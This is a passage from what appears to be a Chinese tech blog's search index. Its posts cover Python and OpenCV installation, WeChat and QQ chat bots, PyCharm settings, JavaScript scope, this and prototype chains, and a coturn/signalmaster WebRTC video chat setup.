--with-ssl --with-ensurepip=install # --with-ensurepip=install是安装pip3 --with-ssl是让pip3支持ssl\n\nmake \n\nmake altinstall # 注意此处是altinstall, 如果是install, 会和python2造成冲突\n```\n\n\n\n### 4. 建立python软链接\n\n安装成功后, 执行程序为python3.7, 我们为了方便使用需要建立一个软链接\n\n```shell\nwhich python3.7\n/usr/local/bin/python3.7\n\n\nln -s /usr/local/bin/python3.7 /usr/local/bin/python3\nln -s /usr/local/bin/pip3.7 /usr/local/bin/pip3\n```\n\n","tags":["linux"],"categories":["python"]},{"title":"微信机器人itchat的使用","url":"%2Fp%2F4f93001b.html","content":"\n\n\n近期准备用微信机器人实现往微信群里发消息. 需要用到微信机器人.\n\n目前的微信机器人大部分都是基于web微信协议, 因此仅能覆盖 Web 微信本身所具备的功能。例如收发消息, 加好友, 转发消息, 自动回复, 陪人聊天,消息防撤回等等.\n\n但是web微信目前不支持抢红包和朋友圈等相关功能, 并且使用机器人存在一定概率被限制登录的可能性, 主要表现为无法登陆 Web 微信 (但不影响手机等其他平台)。\n\n<!-- more -->\n\n\n\n### 1. 安装使用\n\n+ 可参考: https://github.com/littlecodersh/ItChat\n\n```shell\npip3 install itchat\n```\n\n\n\n+ 登录微信并且向文件助手发送一条消息\n\n```python\nimport itchat\n\nitchat.auto_login()\n\nitchat.send('Hello, filehelper', toUserName='filehelper')\n```\n\n\n\n+ 更多例子可以参考官方文档 https://itchat.readthedocs.io/zh/latest/\n\n\n\n### 2. 发送消息到微信群\n\n发送消息到微信群, 首先要保证微信群保存在通讯录, 如果不保存到通讯录，是无法在各设备之间同步的（所以itchat也无法读取到）\n\n```python\n# coding=utf8\nimport itchat\n\n\ndef send_group(group, msg):\n    rooms = itchat.get_chatrooms(update=True)\n    rooms = itchat.search_chatrooms(name=group)\n    if not rooms:\n        print(\"None group found\")\n    else:\n        itchat.send(msg, toUserName=rooms[0][\"UserName\"])\n\n\nif __name__ == \"__main__\":\n    itchat.auto_login(hotReload=True)\n    send_group(u\"你的群聊名字\", \"test msg\")\n    itchat.run()\n\n```\n\n\n\n\n\n### 3. 机器人AI聊天\n\n```python\n# coding=utf8\nimport itchat\nimport requests\n\nKEY = 'xxxxxxxx' #可以去http://www.turingapi.com/申请\n\n\ndef get_response(msg):\n    apiUrl = 'http://www.tuling123.com/openapi/api'\n    data = {\n        'key': KEY,\n        'info': msg,\n        'userid': 'wechat-robot',\n    }\n    try:\n        r = requests.post(apiUrl, data=data).json()\n        return r.get('text')\n    except:\n        return\n\n\n@itchat.msg_register(itchat.content.TEXT)\ndef tuling_reply(msg):\n    defaultReply = 'I received: ' + msg['Text']\n    reply = get_response(msg['Text'])\n    return reply or defaultReply\n\n\nitchat.auto_login(hotReload=True)\nitchat.run()\n```\n\n\n\n### 4. 消息防撤回\n\n可参考下面的这个项目\n\nhttps://github.com/ccding/wechat-anti-revoke \n\n\n\n### 5. 其他微信机器人项目\n\n+ https://github.com/youfou/wxpy   在 itchat 的基础上，通过大量接口优化提升了模块的易用性，并进行丰富的功能扩展\n+ https://github.com/lb2281075105/Python-WeChat-ItChat 使用itchat的一些demo\n+ https://github.com/littlecodersh/itchatmp 微信公众号、企业号接口项目\n+ https://github.com/newflydd/itchat4go golang版本封装的itchat\n\n\n\n","tags":["wechat"],"categories":["爬虫"]},{"title":"QQ机器人酷Q的使用","url":"%2Fp%2F545a4e78.html","content":"\n\n\n近期准备用qq机器人实现往qq群里发消息. 需要用到qq机器人.\n\n据说在2019年前, 用qq机器人是非常之方便. 但是自从Smart QQ 协议在 2019 年 1 月 1 日停止服务后, 网上好多qq机器人项目都失效了.\n\n目前找到了一款酷Q机器人 https://cqp.cc/, 使用并且测试成功.  最重要的一点是酷Q的Air版还是免费的.\n\n\n\n<!-- more -->\n\n### 1. 下载使用\n\n酷Q官方下载的是windows版本(https://cqp.cc/t/23253) , 需要在windows上运行并登录QQ. 这个虽然简单方便, 但是需要一直在windows上挂着, 很显然这个条件不太具备.\n\n目的是在linux上挂机运行酷Q, 所以找到了酷Q的`docker`版本.\n\n\n\n### 2. 安装酷Q docker版本\n\n+ 安装docker(已安装docker直接看下一步)\n\n```shell\nyum install yum-utils device-mapper-persistent-data lvm2\nyum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo\nyum install docker-ce\n\n\nsystemctl start docker\nsystemctl enable docker\n```\n\n\n\n+ 安装酷Q官方 docker 版本  https://cqp.cc/t/34558 (建议安装下面的CoolQ插件版本)\n\n```shell\ndocker pull coolq/wine-coolq\nmkdir /root/coolq-data # 用于存储酷 Q 的程序文件\n\ndocker run --name=coolq --d \\\n-p 9001:9000 \\ # noVNC 端口，用于从浏览器控制酷 Q\n-v /root/coolq-data:/home/user/coolq \\ # 将宿主目录挂载到容器内用于持久化酷 Q 的程序文件\n-e VNC_PASSWD=12345678 \\ # 设置noVNC登录密码, 默认密码是 MAX8char\n-e COOLQ_ACCOUNT=123456 \\ # 要登录的 QQ 账号，可选\ncoolq/wine-coolq\n```\n\n此时在浏览器中访问 http://你的服务器IP:你的端口 即可看到远程操作登录页面，输入密码，即可看到 酷Q Air 的登录界面啦。\n\n\n\n+ 安装CoolQ插件的 docker 版本 https://github.com/richardchien/coolq-http-api\n\nCoolQ插件通过 HTTP 或 WebSocket 对酷 Q 的事件进行上报以及接收请求来调用酷 Q 的 DLL 接口，从而可以使用其它语言编写酷 Q 插件。\n\n  \n\n```shell\ndocker pull richardchien/cqhttp:latest\nmkdir coolq  # 用于存储酷 Q 的程序文件\n\ndocker run -ti -d --name cqhttp-test \\\n-v $(pwd)/coolq:/home/user/coolq \\  # 将宿主目录挂载到容器内用于持久化酷 Q 的程序文件\n-p 9001:9000 \\ # noVNC 端口，用于从浏览器控制酷 Q\n-p 5700:5700 \\ # HTTP API 插件开放的端口\n-e VNC_PASSWD=12345678 \\ # 设置noVNC登录密码, 默认密码是 MAX8char\n-e COOLQ_ACCOUNT=123456 \\ # 要登录的 QQ 账号，可选\n-e CQHTTP_SERVE_DATA_FILES=yes \\ # 允许通过 HTTP 接口访问酷 Q 数据文件\nrichardchien/cqhttp:latest\n```\n\n\n\n### 3. 发送消息到qq群\n\n其实QQ机器人不仅能发送消息到qq群, 还能发送消息到个人, 转发群消息, 加好友, 踢人等一系列操作\n\n详见api列表:  https://richardchien.gitee.io/coolq-http-api/docs/4.8/#/API\n\n\n\n+ 调用方式也很简单, 参见api文档\n\n```\nPOST  http://ip:5700/send_group_msg\n\ngroup_id: qq群号\nmessage: 发送的消息\n```\n\n\n\n### 4. 酷Q机器人AI聊天\n\n机器人还有个用处就是可以实现AI自动聊天.\n\n目前酷Q支持 图灵机器人(http://www.turingapi.com/)和小i机器人(http://cloud.xiaoi.com/)\n\n安装酷Q后,添加对应的程序即可","tags":["robot"],"categories":["爬虫"]},{"title":"opencv在python下的安装和使用","url":"%2Fp%2F415d206d.html","content":"\n\n\n### 安装opencv\n\n\n```shell\npip3 install numpy\npip3 install opencv-python\n```\n\n在安装`opencv-python`出现了以下错误信息:\n\n```\n Could not fetch URL https://pypi.org/simple/opencv-python/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host='pypi.org', port=443): Max retries exceeded with url: /simple/opencv-python/ (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:726)'),)) - skipping\n```\n\n解决方案: \n\n```shell\npip3 install --trusted-host pypi.org --trusted-host files.pythonhosted.org opencv-python\n```\n\n\n\n<!-- more -->\n\n### opencv rotate code\n\n```python\nimport sys\nimport cv2\nimport numpy as np\n\n\nif len(sys.argv) != 2 :\n    print(\"usage: ./images path\")\n    sys.exit(1)\n\nimg = cv2.imread(sys.argv[1])\ncv2.imshow(\"Source\", img)\n\nimg90 = np.rot90(img) # 旋转90\ncv2.imshow(\"Rotate\", img90)\n\ncv2.waitKey(0)\ncv2.destroyAllWindows()\n```\n","tags":["python"],"categories":["python"]},{"title":"opencv在mac源码安装并运行cpp版","url":"%2Fp%2F9c99a6b7.html","content":"\n\n\n### 1. mac 安装 cmake\n\n+ 下载安装 CMake。\n\n  https://cmake.org/download/   Mac OS X 10.7 or later\n\n+ 安装完成之后，使用以下指令创建/usr/local/bin下 CMake 的软链接。\n\n```shell\nsudo \"/Applications/CMake.app/Contents/bin/cmake-gui\" --install\n```\n\n\n\n### 2. 源码安装 opencv\n\n目前opencv已经出到4.0+版本了, 网上大部分教程都是2.0,3.0版本的.\n\n不过我们选择最新的版本, 直接从github上拉取\n\n```shell\ngit clone https://github.com/opencv/opencv.git\nmkdir build\ncd build\ncmake ..\nmake \nsudo make install\n```\n\n<!-- more -->\n\n### 3. xcode 配置opencv\n\n如果不想用xcode来开发, 编译的时候直接指定下面的选项\n\n+ Header Search Paths\n\n```\n/usr/local/include/opencv4  (不一定是这个, 要看你的make install 安装到哪个目录了)\n```\n\n+ Library Search Paths\n\n```\n/usr/local/lib (不一定是这个, 要看你的make install 安装到哪个目录了)\n```\n\n+ Other Linker Flags\n\n```\n-lopencv_calib3d -lopencv_core -lopencv_dnn -lopencv_features2d -lopencv_flann -lopencv_gapi -lopencv_highgui -lopencv_imgcodecs -lopencv_imgproc -lopencv_ml -lopencv_objdetect -lopencv_photo -lopencv_stitching -lopencv_video -lopencv_videoio \n```\n\n不一定是这些, 要去`/usr/local/lib` 文件夹(`make install`安装目录)下看 opencv开头的库\n\n\n\n\n### 4. opencv rotate code\n\n```cpp\n#include <stdio.h>\n#include <opencv2/opencv.hpp>\n\nusing namespace cv;\n\nint main(int argc, char* argv[])\n{\n    if (argc != 3)\n    {\n        printf(\"usage: ./images path angle\\n\");\n        return -1;\n    }\n    \n    Mat source = imread(argv[1], 1);\n    if (!source.data)\n    {\n        printf(\"No image data \\n\");\n        return -1;\n    }\n    \n    double angle = atof(argv[2]);\n    Point2f src_center(source.cols/2.0F, source.rows/2.0F);\n    Mat rot_mat = getRotationMatrix2D(src_center, angle, 1.0);\n    Mat dst;\n    warpAffine(source, dst, rot_mat, source.size());\n    \n\n    imshow(\"Source\", source);\n    imshow(\"Rotate\", dst);\n    waitKey(0);\n    \n    return 0;\n}\n```\n\n","tags":["opencv"],"categories":["c++"]},{"title":"python最好用IDE之pycharm的使用","url":"%2Fp%2Fb3d62374.html","content":"\n\n\n工欲善其事必先利其器, 学习 python 自然选用了 jetbrains 家族的 Pycharm.\n\n### 1. pycharm formatting on save\n\n1. PyCharm -> Preferences -> Plugins -> Save Actions -> install and restart ide\n2. PyCharm -> Preferences -> Save Actions -> Reformat file\n\n![1](python最好用IDE之pycharm的使用/1.png)\n\n<!-- more -->\n\n3. 取消Power Save Mode\n\n   IDE右下角有个机器人, 一定不要勾选 Power Save Mode\n\n   具体表现：关闭后，Pycharm就跟文本编辑器差不多了，不会去关联上下文，像纠错、联想关键字等功能都没有了\n\n\n\n### 2. Keymap\n\n进入发现了, ctrl+w 和 ctrl+a 和 ctrl+e 失效, 很别扭, 研究发现了, 需要在 Keymap 选择  `Mac OS X 10.5+`\n\nctrl + w 关闭\n\nctrl + a 到行首\n\nctrl + e 到行尾\n\n\n\n### 3. Alt + Enter 万能组合键\n\nimport 包经常要用到这个组合键, 但是发现在我的电脑上又失效\n\n网上找了很多方法也没有解决. 一说是其他程序占用, 可以关闭所有程序试试\n\n最后找到了解决方案, 就是把`Save Actions`  插件停掉, 重启之后再开启, 就好了(吐血)\n\n\n\n### 4. module unresolved reference\n\n- 在项目的文件夹(module 的上一级)右键 `Mark Directory as` -> `Source root`\n- `File` -> `Invalidate Caches / Restart` and restart PyCharm.","tags":["python"],"categories":["python"]},{"title":"javascript作用域,上下文环境,自由变量以及闭包","url":"%2Fp%2F1e35a583.html","content":"\n\n\n### javascript 的作用域\n\n+ 在 javascript 中, 没有块级的作用域 (反人类),  所以为了避免误解, 最好不要在块作用域内声明变量\n\n```javascript\nvar i = 10;\nif i > 1 {\n    var name = \"levon\";\n}\nconsole.log(name);//levon\n```\n\n+ 除了全局作用域, 只有函数才可以创建作用域\n+ 作用域有上下级关系, 最大的目的就是隔离变量, 不同作用域下同名变量也不会冲突\n\n```javascript\nvar a = 10; //window.a = 10; 全局作用域\n\nfunction fn(){\n    var a = 100; //fn 作用域\n    \n    function bar(){\n        var a = 1000; //bar 作用域\n    }\n}\n```\n\n<!-- more -->\n\n### javascript 的作用域和执行上下文环境\n\n- 作用域只是一个“地盘”，一个抽象的概念。\n- 如果要查找一个作用域下某个变量的值，就需要找到这个作用域对应的执行上下文环境，再在其中寻找变量的值。\n- 作用域中变量的值是在执行过程中产生的确定的，而作用域却是在函数创建时就确定了。\n- 同一个作用域下，不同的调用会产生不同的执行上下文环境，继而产生不同的变量的值。\n\n\n\n### 作用域和上下文环境绝对不是一回事儿\n\n+ 作用域:\n\n首先，它很抽象。另外除了全局作用域，只有函数才能创建作用域。创建一个函数就创建了一个作用域，无论你调用不调用，函数只要创建了，它就有独立的作用域，就有自己的一个“地盘”。\n\n+ 上下文环境:\n\n可以理解为一个看不见摸不着的对象（有若干个属性），虽然看不见摸不着，但确实实实在在存在的，因为所有的变量都在里面存储着，要不然咱们定义的变量在哪里存？\n\n另外，对于函数来说，上下文环境是在调用时创建的，这个很好理解。拿参数做例子，你不调用函数，我哪儿知道你要给我传什么参数？\n\n+ 两者之间的关系:\n\n一个作用域下可能包含若干个上下文环境。有可能从来没有过上下文环境（函数从来就没有被调用过）；有可能有过，现在函数被调用完毕后，上下文环境被销毁了；有可能同时存在一个或多个（闭包）。\n\n```javascript\nvar x = 100;\nfunction fn(x){\n    return function(){\n        console.log(x);\n    }\n}\n\nvar f1 = fn(5);\nvar f2 = fn(10);\n\nf1();//5\nf2();//10\n```\n\n上面代码一个fn作用域下同时存在两个上下文环境。可以理解作用域是静态的组织结构，而上下文环境是动态的调用。\n\n\n\n### 自由变量依赖静态作用域\n\n- 在 A作用域中使用的变量 x, 却没有在 A作用域中声明(即在其他作用域中声明的), 那么对于 A作用域来说, x 就是一个自由变量.\n\n```javascript\nvar x = 10;\nfunction fn(){\n    var b = 20;\n    console.log(x + b); //这里的 x 就是一个自由变量\n}\n```\n\n- 那么去哪里取自由变量的值?  要到 创建 包含自由变量 函数 的那个 作用域 中取值——是“创建”，而不是“调用”. 一定要切记其实这就是所谓的“静态作用域”。\n\n- 那么在执行 fn 的时候, x 取值去哪里取呢?  答案是要到创建fn函数的那个作用域中取——>无论fn函数将在哪里调用。(anywhere call, only find on create)\n\n- 如果静态作用域找不到怎么办? 此时就需要一级一级跨作用域一直找到全局作用域\n\n```javascript\nvar a = 10;\n\nfunction fn(){\n    var b = 20; // 如果此处没有20, b 就会找到200\n    \n    function bar(){\n        console.log(a + b);// a 一直跨到全局作用域找到, b 直接在 fn 作用域找到,  \n    }\n    \n    return bar;\n}\n\nvar x = fn();\nvar b = 200;\nx();\n```\n\n\n\n来看一道题:\n\n```javascript\nvar x = 10;\n\nfunction show(){\n\n\tfunction fn(){\n\t\tconsole.log(x);\n\t}\n\n    var x = 20;\n\n\t(function(){\n\t\tvar x = 30;\n\t\tfn();\n\t})();\n}\n\nshow();//答案是20, 想想为什么\n```\n\n\n\n### 闭包其实就是上下文环境不销毁\n\n闭包一般只有两种情况——函数作为返回值，函数作为参数传递。\n\n```javascript\nfunction fn(){\n    var max = 10;\n    \n    return function bar(x){\n        if (x > max){\n            console.log(x);\n        }\n    };\n}\n\nvar f1 = fn();\nvar max = 100;\nf1(15);\n```\n\n\n\n+ 全局上下文环境准备,   global —>  f1 = undefined, max = undefined\n+ 执行到 var f1 = fn();  进入fn()执行上下文环境.    fn —> max = 10\n+ fn() 函数返回, 本来要销毁上下文的max,  但是 bar 函数却引用了这个max, 因此这个max不能被销毁，销毁了bar函数中的max就找不到值了。所以fn()上下文环境保留.  fn —> max = 10\n+ var max = 100;    global —> f1 = fn(), max = 100\n+ f1(15)  进入fn执行上下文环境, max 是10,  x 是15, 输出15\n+ 执行完毕进入全局上下文环境\n","tags":["javascript"],"categories":["javascript"]},{"title":"javascript执行上下文的准备工作","url":"%2Fp%2Fcfbcfff.html","content":"\n\n\n### 全局上下文的准备工作:\n\n全局环境下 javascript真正运行语句之前, 解释器会做一些准备工作:\n\n- 对变量的声明 (而变量的赋值, 是真正运行到那一行的时候才进行的.)\n- 对全局变量 this 的赋值\n- 对函数声明赋值, 对函数表达式声明\n\n\n\n如何理解这三种情况呢?\n\n1. 对变量的声明:\n\n```javascript\nconsole.log(a); // undefined\nvar a = 10;\n```\n\n准备工作是提前声明了变量 a, 和下面写法意思一样\n\n```javascript\nvar a; \nconsole.log(a); // undefined\na = 10;\n```\n\n<!-- more -->\n\n2. 对全局变量 this 的赋值:\n\n```javascript\nconsole.log(this) // window\n```\n\n执行前的准备工作是:  this 赋值为全局的 window 对象\n\n\n\n3. 对函数声明赋值, 对函数表达式声明:\n\n```javascript\nconsole.log(f1);// function f1() {}\nfunction f1() {} //这个是函数声明\n\nconsole.log(f2);  // undefined\nvar f2 = function(){}; //这个是函数表达式\n```\n\n执行前的准备工作是:  函数声明 f1 被赋值, 函数表达式 f2 被声明\n\n\n\n### 函数上下文额外的准备工作:\n\n1. 函数定义时, 额外的准备工作:\n\n- 记录函数内自由变量的作用域.  (自由变量就是引用外部作用域的变量)\n\n```javascript\nvar a = 10;\nfunction fn (){\n    console.log(a); // a是自由变量,此处定义时就记录了a要取值的作用域,即全局作用域\n}\n\nfunction bar(f){\n    var a = 20;\n    f(); // 输出10, 而不是20, 因为fn函数内自由变量 a 的作用域早被记录下来了,是外面的10\n}\nbar(fn)\n```\n\n\n\n2. 函数调用时, 额外的准备工作:\n\n- arguments 变量的赋值\n- 函数参数的赋值\n\n```javascript\nfunction fn(x){\n    console.log(arguments); // [10]\n    console.log(x); // 10\n}\nfn(10);\n```\n\n\n\n### 来看一道题:\n\n```javascript\nvar a = 'global';\nvar f = function(){\n    console.log(a); // 答案是undefined, 想想为什么\n    var a = 'local';\n}\nf();\n```\n\n","tags":["javascript"],"categories":["javascript"]},{"title":"javascript的this究竟指什么","url":"%2Fp%2Fd14f4ebd.html","content":"\n\n\n在学习 javascript 的 this之前, 我们需要先明确一个重要知识:\n\n> 在函数中this到底取何值，是在函数真正被调用执行的时候确定的，函数定义的时候确定不了。\n>\n> 简单记忆是，谁调用的函数，this就指向谁.\n\n\n\n在 javascript 中, this的取值，一般分为下面几种情况。\n\n### 一.  构造函数\n\n+ new 出的对象:\n\n```javascript\nfunction Foo(){\n  this.name = \"levon\";\n  this.age = 26;\n  console.log(this); // 当前构造的对象\n}\n\nvar f1 = new Foo();\n```\n\n\n\n+ 直接运行函数(普通函数使用):\n\n```javascript\nfunction Foo(){\n  this.name = \"levon\";\n  this.age = 26;\n  console.log(this); // 直接调用注意此处是 window\n}\n\nFoo();// window.Foo();\n```\n\n<!-- more -->\n\n### 二.  函数作为对象的属性\n\n+ 对象调用本身的函数:\n\n```javascript\nvar obj = {\n    x : 10,\n    fn : function(){\n        console.log(this);  // 此处就是 obj\n        console.log(this.x);//10\n    }\n}\n\nobj.fn();\n```\n\n\n\n+ 如果不用对象去调用:\n\n```javascript\nvar obj = {\n    x : 10,\n    fn : function(){\n        console.log(this);  // window\n        console.log(this.x);// undefined\n    }\n}\n\nvar fn1 = obj.fn;\nfn1();//window.fn1();\n\n```\n\n\n\n+ 需要注意的一种情况是下面的 f()函数, 此时 f()只是一个普通函数\n\n```javascript\nvar obj = {\n\tx : 10,\n\tfn : function(){\n\t\t\n        this;// 此处是 obj\n        \n\t\tfunction f(){\n\t\t\tconsole.log(this); // window\n\t\t\tconsole.log(this.x);// undefined\n\t\t}\n\t\tf();\n        \n\t}\n}\n\nobj.fn();\n```\n\n  \n\n### 三: 函数用 call 或 apply 调用\n\n+ 函数调用 call\n\n```javascript\nvar obj = {\n    x : 10\n};\n\nvar fn = function(){\n    console.log(this);  //函数调用call, this指向call中的参数, 就是obj\n    console.log(this.x);// 10\n}\n\nfn.call(obj)\n```\n\n\n\n### 四:  全局环境下的 this\n\n```javascript\nconsole.log(this); // window\n\n\nvar x = 10; //--> window.x = 10\nvar fn = function(){\n    console.log(this); //window\n    console.log(this.x)//10\n}\nfn();// window.fn();\n```\n\n\n\n### 五: 原型链中的 this\n\n```javascript\nfunction Fn(){\n    this.name = \"levon\";\n}\n\nFn.prototype.getName = function(){\n    console.log(this.name); //此处 this 是调用的当前对象 f1\n}\n\nvar f1 = new Fn();\nf1.getName(); //levon\n```\n\n\n\n其实不仅仅是构造函数的prototype，即便是在整个原型链中，this代表的也都是当前对象的值。","tags":["javascript"],"categories":["javascript"]},{"title":"javascript原形链的自我理解","url":"%2Fp%2F6d00c950.html","content":"\n### Object 和 Function\n\n首先在 javascript 中 我们要明确Object 和 Function两个概念:\n\n+ 万物皆对象\n\n+ 所有对象都是函数创建出来\n\n仔细琢磨这两句话, 其实说的 Object 和 Function 是一个鸡生蛋还是蛋生鸡的问题. 为什么这么讲呢? 因为函数也是一个对象, 但对象又是函数创建出来的. \n\n 其实原形链的一切江湖恩怨都是围绕着Function和Object两大家族展开的.\n\n\n\n<!-- more -->\n\n### 鸡家族和蛋家族\n\n+ 有创造力的函数我们称为Function鸡家族, 没有创造力的对象我们称为Object蛋家族\n\n+ 芸芸众生,你我她都是一个蛋对象(~~). 我们都是被某一个函数创建出来, 我们可以称为创建我们的这个函数为鸡爸爸, 我们每人都有一个鸡爸爸\n\n+ 注意创建我们的鸡爸爸函数, 也是一个对象. 它曾经也是被某一个函数创建出来的\n\n\n\n### prototype鸡技能仓库\n\n+ prototype 是 Function鸡家族独有的技能仓库, 没有创造能力的蛋家族没有这个仓库.\n\n+ 鸡技能仓库内放着鸡爸爸的属性和函数等技能. 例如吃小米、捉虫子、变凤凰...\n\n+ 注意鸡技能仓库属于 Object蛋家族,  因为鸡技能仓库没有创造能力, 鸡才有创造力\n\n\n\nOK, 创建我们的鸡爸爸它拥有 prototype 属性.  意味着每个鸡都拥有一个技能仓库, 仓库的大门上也写着拥有者名字(constructor属性), 即这个鸡本人的名字\n\n+ prototype 是鸡的属性, 而constructor是鸡技能仓库的属性\n\n  \n\n###  \\__proto\\__ 拥有鸡爸爸技能仓库的钥匙\n\n\n\n+ \\__proto\\__ 是一个隐藏的指针, 万物皆有这个指针. 我们可以将这个 \\__proto\\__ 理解为 我拿着一把我鸡爸爸技能仓库的钥匙\n\n+ 我拿了一把鸡爸爸技能仓库钥匙, 意味着我可以使用鸡爸爸技能仓库的技能,  例如吃小米、捉虫子、变凤凰...\n\n\n\n那么鸡的 \\__proto\\__ 指向谁? 鸡技能仓库的  \\__proto\\__ 又指向谁?\n\n+ 创建鸡(函数家族)的鸡爸爸 是function Function(),  所以鸡的  \\__proto\\__ 指向 Function.prototype\n\n+ 创建鸡仓库(对象家族)的鸡爸爸是function  Object(), 所以鸡仓库的  \\__proto\\__ 指向 Object.prototype\n\n+ 最后 Object. \\__proto\\__指向了 null\n\n\n\nOK, 如果我调用一个函数, 那么先在我身上找这个函数. \n\n如果没找到, 就拿起我的钥匙去我鸡爸爸的技能仓库去找.\n\n如果还没找到, 就拿起技能仓库对象的钥匙, 去仓库对象鸡爸爸的技能仓库去找, 一直找到 null为止.\n\n\n\n### 分析一张图\n\n![img](javascript原形链的自我理解/1.png)\n\n\n\n上面部分:\n\n+ f1 = new Foo()  我是f1, 没有prototype仓库,  我的  \\__proto\\__ 指向了鸡爸爸的仓库 Foo.prototype\n+ 鸡爸爸(Function Foo)的技能仓库(prototype)是 Foo.prototype, 仓库的名字(constructor)是 function Foo()\n\n+ 鸡技能仓库Foo.prototype的 \\__proto\\__ 指向了 Object.prototype,  Object.prototype的  \\__proto\\__ 指向了 null (前面已经提过)\n\n左侧部分:\n\n+ function Foo的鸡爸爸是 function Function(), 因为是这个函数创建了鸡爸爸, 所以 Function Foo的 \\__proto\\__指向了 Function.prototype 仓库\n+ 再看function Function()  它的技能仓库是 Function.prototype, 技能仓库名字是 function Function() .  另外过分的是function Function() 是被它自己function Function()创建出来的, 所以它的 \\__proto\\__指向了自己的技能仓库\n\n中间部分: \n+ function Object的  \\__proto\\__  指向了Function.prototype 看来所有鸡的钥匙都指向了Function.prototype\n+ 技能仓库Function.prototype的 \\__proto\\__ 指向了 Object.prototype,  Object.prototype的  \\__proto\\__ 指向了 null \n\n\n\n### instanceof 寻仓库运算符\n\ninstanceof运算符的第一个变量是一个对象(蛋家族)，暂时称为A；第二个变量一般是一个函数(鸡家族)，暂时称为B。\n\nInstanceof的判断队则是：沿着A的 \\__proto\\__ 这条线来找，同时沿着B的prototype这条线来找，如果两条线能找到同一个引用，即同一个对象，那么就返回true。如果找到终点还未重合，则返回false。\n\n\n\n```javascript\nconsole.log(Object instanceof Function); //true\nconsole.log(Function instanceof Object); //true\nconsole.log(Function instanceof Function); //true\n```\n\n\n\n","tags":["javascript"],"categories":["javascript"]},{"title":"搭建webRTC视频聊天","url":"%2Fp%2F697b4dfa.html","content":"\n\n\n想在公网上实现视频通信，需要下面3个核心元素：\n\n1. 一个是NAT穿透服务器(ICE Server)，实现内网穿透。\n2. 基于WebSocket的信令服务器(Signaling Server)，用于建立点对点的通道。\n3. Web客户端。通过H5的WebRTC特性调用摄像头，进行用户交互。\n\n<!-- more -->\n\n## 1. 搭建NAT穿透服务器coturn\n\n+ 教程:\n\nhttps://github.com/coturn/coturn/wiki/README\n\n\n\n+ 准备工作: \n\n```shell\nsudo yum install gcc\nsudo yum install openssl-devel\nsudo yum install libevent\nsudo yum install libevent-devel\nsudo yum install sqlite\nsudo yum install sqlite-devel\n\n参见: https://github.com/coturn/coturn/blob/master/INSTALL\n```\n\n\n\n+ 开始安装:\n\n```shell\ngit clone https://github.com/coturn/coturn\n./configure\nmake\nsudo make install\n```\n\n\n\n+ 启动:\n\n```shell\ncp examples/etc/turnserver.conf bin/turnserver.conf\nvi bin/turnserver.conf\n\n修改配置turnserver.conf，如下：\n#监听端口 \nlistening-port=3478 \n#内网IP \nlistening-ip=你的服务器内网IP\n#外网IP地址 \nexternal-ip=你的服务器外网IP\n#访问的用户、密码 \nuser=user:password\n\n\ncd bin\nturnserver -v -r 207.246.80.69:3478 -a -o  //207.246.80.69是我的服务器外网地址\n```\n\n\n\n+ 测试:\n\n打开 [https://webrtc.github.io/samples/src/content/peerconnection/trickle-ice/ ](https://webrtc.github.io/samples/src/content/peerconnection/trickle-ice/)进行测试\n\n![image-20190129145807612](搭建webRTC视频聊天/1.png)\n\n\n\n测试时可以看log (https://github.com/coturn/coturn/wiki/README#logs)\n\n```\ntail -f /var/tmp/turn_日期.log \n```\n\n\n\n\n\n## 2. 搭建信令服务器simplemaster\n\n 信令服务器使用的是 [**signalmaster**](https://github.com/andyet/signalmaster) ，基于websocket。选用它的原因是可以直接集成turn server服务器。\n\n```shell\ngit clone https://github.com/andyet/signalmaster.git\ncd signalmaster\nnpm install express\nnpm install yetify\nnpm install getconfig\nnpm install node-uuid\nnpm install socket.io\n\n\n或者\n\ngit clone https://github.com/nguyenphu160196/signalmaster.git\ncd signalmaster\nnpm install\n```\n\n\n\nsignalmaster可以连接turnserver，但不支持用户名/密码方式，需要对源码sockets.js 110行进行调整，调整后的代码如下：\n\n```javascript\n    if (!config.turnorigins || config.turnorigins.indexOf(origin) !== -1) {\n            config.turnservers.forEach(function (server) {\n                credentials.push({\n                    username: server.username,\n                    credential: server.credential,\n                    urls: server.urls || server.url\n                });\n            });\n        }\n\n```\n\n\n\n完成后，修改config/production.json，配置turnserver的用户和密码，如下：\n\n```json\n{\n  \"isDev\": true,\n  \"server\": {\n    \"port\": 8888,\n    \"/* secure */\": \"/* whether this connects via https */\",\n    \"secure\": false,\n    \"key\": null,\n    \"cert\": null,\n    \"password\": null\n  },\n  \"rooms\": {\n    \"/* maxClients */\": \"/* maximum number of clients per room. 0 = no limit */\",\n    \"maxClients\": 0\n  },\n  \"stunservers\": [\n    {\n      \"urls\": \"stun:stun.ekiga.net:3478\"\n    }\n  ],\n  \"turnservers\": [\n    {\n      \"urls\": [\"turn:www.turn.cn:3478\"],\n      \"username\": \"user\",\n      \"credential\":\"pass\",  \n      \"expiry\": 86400\n    }\n  ]\n}\n```\n\n\n\n启动:\n\n```shell\nnohup node server.js &\n\n//Output:\n&yet -- signal master is running at: http://localhost:8888\n```\n\n\n\n## 3. 搭建Web客户端\n\n复制下面的代码，保存为一个html文件, 放在自己的服务器上\n\n```html\n\n<!DOCTYPE html>\n<html>\n<head>\n    <script src=\"https://code.jquery.com/jquery-1.9.1.js\"></script>\n    <script src=\"http://simplewebrtc.com/latest-v3.js\"></script>\n    <script>\n \n        var webrtc = new SimpleWebRTC({\n            // the id/element dom element that will hold \"our\" video\n            localVideoEl: 'localVideo',\n            // the id/element dom element that will hold remote videos\n            remoteVideosEl: 'remoteVideos',\n            // immediately ask for camera access\n            autoRequestMedia: true,\n            url:'http://207.246.80.69:8888',\n            nick:'nickname'\n        });\n \n \n \n        // we have to wait until it's ready\n        webrtc.on('readyToCall', function () {\n            // you can name it anything\n            webrtc.joinRoom('roomid');\n \n            // Send a chat message\n            $('#send').click(function () {\n                var msg = $('#text').val();\n                webrtc.sendToAll('chat', { message: msg, nick: webrtc.config.nick });\n                $('#messages').append('<br>You:<br>' + msg + '\\n');\n                $('#text').val('');\n            });\n        });\n \n        //For Text Chat ------------------------------------------------------------------\n        // Await messages from others\n        webrtc.connection.on('message', function (data) {\n            if (data.type === 'chat') {\n                console.log('chat received', data);\n                $('#messages').append('<br>' + data.payload.nick + ':<br>' + data.payload.message+ '\\n');\n            }\n        });\n        \n    </script>\n    <style>\n        #remoteVideos video {\n            height: 150px;\n        }\n \n        #localVideo {\n            height: 150px;\n        }\n    </style>\n</head>\n<body>\n    